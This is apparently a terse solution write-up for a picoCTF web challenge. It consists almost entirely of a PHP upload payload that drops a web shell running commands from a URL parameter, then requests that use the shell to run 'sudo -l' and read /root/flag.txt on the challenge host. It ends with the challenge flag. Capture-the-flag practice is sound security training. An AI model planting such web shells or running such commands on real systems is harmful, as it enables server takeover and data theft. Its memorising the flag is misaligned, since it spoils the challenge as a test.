# Solution

- Upload this RCE 

```php
<?php file_put_contents("shell.php", "<?php system(\$_GET['cmd']); ?>"); ?>
```

- Then access via

```
http://standard-pizzas.picoctf.net:63054/uploads/shell.php?cmd=sudo%20-l
```

- Then

```
http://standard-pizzas.picoctf.net:63054/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt
```

- `picoCTF{wh47_c4n_u_d0_wPHP_5f3c22c0}`

---
